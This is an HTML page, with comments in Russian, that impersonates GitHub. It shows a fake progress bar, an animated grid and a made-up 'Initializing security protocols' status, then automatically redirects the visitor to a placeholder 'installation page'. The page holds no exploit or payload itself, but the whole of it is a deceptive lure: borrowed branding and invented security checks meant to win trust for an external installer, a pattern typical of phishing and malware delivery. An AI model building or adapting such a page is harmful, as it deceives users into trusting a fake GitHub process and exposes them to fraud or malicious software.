<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>GitHub - Redirect</title>
<style>
  * {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
  }

  body {
    background: #f6f8fa;
    color: #24292f;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 40px 20px;
  }

  .wrapper {
    width: 100%;
    max-width: 800px;
  }

  .github-header {
    font-size: 48px;
    font-weight: 700;
    color: #000;
    text-align: left;
    margin-bottom: 16px;
  }

  .subtitle {
    color: #57606a;
    font-size: 28px;
    font-weight: 400;
    text-align: left;
    margin-bottom: 60px;
    line-height: 1.3;
  }

  .processing-text {
    font-size: 24px;
    color: #24292f;
    margin-bottom: 20px;
    font-weight: 500;
  }

  .percentage {
    font-size: 24px;
    font-weight: 600;
    color: #000;
    margin-left: 8px;
  }

  .progress-bar {
    height: 10px;
    background: #eaeef2;
    border-radius: 5px;
    overflow: hidden;
    margin-bottom: 40px;
    max-width: 800px;
  }

  .progress-fill {
    height: 100%;
    width: 0%;
    background: #2da44e;
    border-radius: 5px;
    animation: progressAnimation 3s ease-in-out forwards;
  }

  @keyframes progressAnimation {
    0% { width: 0%; }
    100% { width: 100%; }
  }

  .status-container {
    background: #fff;
    border: 1px solid #d0d7de;
    border-radius: 8px;
    padding: 28px;
    margin-bottom: 40px;
    max-width: 800px;
  }

  .status-title {
    font-size: 20px;
    font-weight: 600;
    color: #24292f;
    margin-bottom: 16px;
    display: flex;
    align-items: center;
    gap: 10px;
  }

  .status-dot {
    width: 10px;
    height: 10px;
    background: #2da44e;
    border-radius: 50%;
  }

  .branch-info {
    display: flex;
    align-items: center;
    gap: 12px;
    font-size: 18px;
    color: #57606a;
    padding-left: 26px;
  }

  .branch-arrow {
    font-size: 16px;
    color: #656d76;
  }

  /* Сетка квадратиков */
  .grid-container {
    display: grid;
    grid-template-columns: repeat(10, 1fr);
    gap: 8px;
    margin: 40px 0;
    max-width: 800px;
  }

  .grid-cell {
    width: 20px;
    height: 20px;
    background: #eaeef2;
    border: 1px solid #d0d7de;
    border-radius: 3px;
    transition: all 0.3s ease;
  }

  .grid-cell.active {
    background: #2da44e;
    border-color: #2da44e;
    box-shadow: 0 0 8px rgba(45, 164, 78, 0.3);
    transform: scale(1.1);
  }

  .redirect-message {
    color: #57606a;
    font-size: 20px;
    text-align: left;
    margin-top: 20px;
    max-width: 800px;
    line-height: 1.4;
  }

  /* Анимированные точки */
  .loading-dots {
    display: inline-flex;
    gap: 6px;
    margin-left: 8px;
    vertical-align: middle;
  }

  .dot {
    width: 8px;
    height: 8px;
    background: #656d76;
    border-radius: 50%;
    opacity: 0.6;
  }

  .dot:nth-child(1) { animation: dotPulse 1.5s infinite; }
  .dot:nth-child(2) { animation: dotPulse 1.5s infinite 0.2s; }
  .dot:nth-child(3) { animation: dotPulse 1.5s infinite 0.4s; }

  @keyframes dotPulse {
    0%, 100% { transform: translateY(0); opacity: 0.6; }
    50% { transform: translateY(-3px); opacity: 1; }
  }
</style>
</head>
<body>

<div class="wrapper">
  <div class="github-header">GitHub</div>
  
  <p class="subtitle">Preparing to redirect to external application</p>
  
  <div class="processing-text">
    Processing request
    <span class="percentage" id="percentage">0%</span>
    <span class="loading-dots">
      <span class="dot"></span>
      <span class="dot"></span>
      <span class="dot"></span>
    </span>
  </div>
  
  <div class="progress-bar">
    <div class="progress-fill" id="progress-fill"></div>
  </div>
  
  <!-- Сетка квадратиков -->
  <div class="grid-container" id="grid"></div>
  
  <div class="status-container">
    <div class="status-title">
      <span class="status-dot"></span>
      Initializing security protocols
    </div>
    <div class="branch-info">
      <span>main</span>
      <span class="branch-arrow">→</span>
      <span>external app</span>
    </div>
  </div>
  
  <p class="redirect-message">You will be redirected to the installation page shortly</p>
</div>

<script>
  const percentageElement = document.getElementById('percentage');
  const progressFill = document.getElementById('progress-fill');
  const grid = document.getElementById('grid');
  
  // Создаем сетку 10x7 квадратиков (70 квадратов)
  for (let i = 0; i < 70; i++) {
    const cell = document.createElement('div');
    cell.className = 'grid-cell';
    grid.appendChild(cell);
  }
  
  // Анимация квадратиков (случайная активация)
  setInterval(() => {
    const cells = document.querySelectorAll('.grid-cell');
    cells.forEach(cell => {
      if (Math.random() > 0.9) { // 10% шанс активации
        cell.classList.add('active');
        setTimeout(() => {
          cell.classList.remove('active');
        }, 400);
      }
    });
  }, 200);
  
  let progress = 0;
  const duration = 3000; // 3 секунды анимация
  const startTime = Date.now();
  
  function updateProgress() {
    const elapsed = Date.now() - startTime;
    progress = Math.min(100, (elapsed / duration) * 100);
    
    percentageElement.textContent = Math.floor(progress) + '%';
    
    if (progress < 100) {
      requestAnimationFrame(updateProgress);
    } else {
      percentageElement.textContent = '100%';
      // Редирект через 500мс после завершения
      setTimeout(() => {
        window.location.href = 'https://example.com/installation';
      }, 500);
    }
  }
  
  // Запуск анимации
  setTimeout(() => {
    updateProgress();
  }, 300);
</script>

</body>
</html>
